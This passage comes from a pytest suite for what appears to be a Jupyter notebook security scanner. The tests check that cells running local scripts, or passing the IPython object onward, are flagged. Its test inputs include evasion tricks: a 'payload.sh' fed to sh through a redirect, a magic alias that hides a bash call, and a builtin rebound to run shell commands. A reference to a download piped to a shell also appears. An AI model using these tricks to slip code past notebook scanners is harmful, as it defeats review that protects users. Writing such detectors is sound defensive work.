    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert "IPython object" in findings[0][1]
    assert len(shortfalls) == 1


_KERNEL_CHECK_CELL = (
    "ip = get_ipython()\n"
    "if isinstance(ip, object) and hasattr(ip, 'kernel'):\n"
    "    print(type(ip))\n"
)


@pytest.mark.parametrize(
    "cell",
    [
        "print(get_ipython())\n",
        _KERNEL_CHECK_CELL,
        "getattr(get_ipython(), 'execution_count')\n",
    ],
)
def test_the_ipython_object_given_to_a_builtin_that_runs_nothing_is_clean(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


def test_a_builtin_name_the_notebook_rebinds_is_not_trusted_with_the_ipython_object(
    tmp_path: Path,
) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("def print(shell):\n    shell.system('ls')\n", "print(get_ipython())\n")
    )
    findings, _ = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]


@pytest.mark.parametrize(
    ("cells", "script"),
    [
        (("!sh setup.sh\n",), "setup.sh"),
        (("!bash -x scripts/install.sh --fast\n",), "scripts/install.sh"),
        (("!./run\n",), "./run"),
        (("!cd repo && ./configure\n",), "./configure"),
        (("%system tools/stage2.sh\n",), "tools/stage2.sh"),
        (("system /srv/stage2.sh",), "/srv/stage2.sh"),
        (("%%bash\nset -e\nbash payload.sh\n",), "payload.sh"),
        (("%%sh\nsh<payload.sh\n",), "payload.sh"),
        (("%alias_magic -c time bash", "%%time\nsh<payload.sh\n"), "payload.sh"),
        (("!source env/activate.sh\n",), "env/activate.sh"),
        (("!sudo -u builder /bin/bash build.sh\n",), "build.sh"),
        (("!python train.py --epochs 3\n",), "train.py"),
        (("get_ipython().system('sh setup.sh')\n",), "setup.sh"),
    ],
)
def test_a_cell_that_runs_a_local_script_is_a_low_finding_naming_it(
    tmp_path: Path, cells: tuple[str, ...], script: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", None)]
    assert findings[0][1].endswith(f": {script}")
    assert shortfalls == []


def test_every_script_a_cell_runs_is_named_in_one_finding(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("!sh a.sh\n!bash b.sh && sh a.sh\n"))
    findings, _ = _run(tmp_path)
    assert [(sev, summary) for sev, summary, _ in findings] == [
        ("LOW", "cell runs local scripts: a.sh, b.sh")
    ]


def test_a_local_script_beside_a_download_piped_to_a_shell_keeps_the_high_finding(
    tmp_path: Path,
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(f"!{_PIPE}\n!sh setup.sh\n"))
    findings, _ = _run(tmp_path)
    assert sorted(sev for sev, _, _ in findings) == ["HIGH", "LOW"]


@pytest.mark.parametrize(
    "cell",
    [
        "!python -m pip install numpy\n",
        "!python3 -c 'print(1)'\n",
        "!pip install -r requirements.txt\n",
        "!ls -la /tmp > listing.txt 2>&1\n",
        "!git clone https://example.invalid/repo.git\n",
        "!/opt/conda/bin/pip install numpy\n",
        "%%bash\nnvidia-smi\necho done\n",
        "!sh -c 'echo hi'\n",
    ],
)
def test_a_tool_run_without_a_script_file_is_not_a_local_script(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])
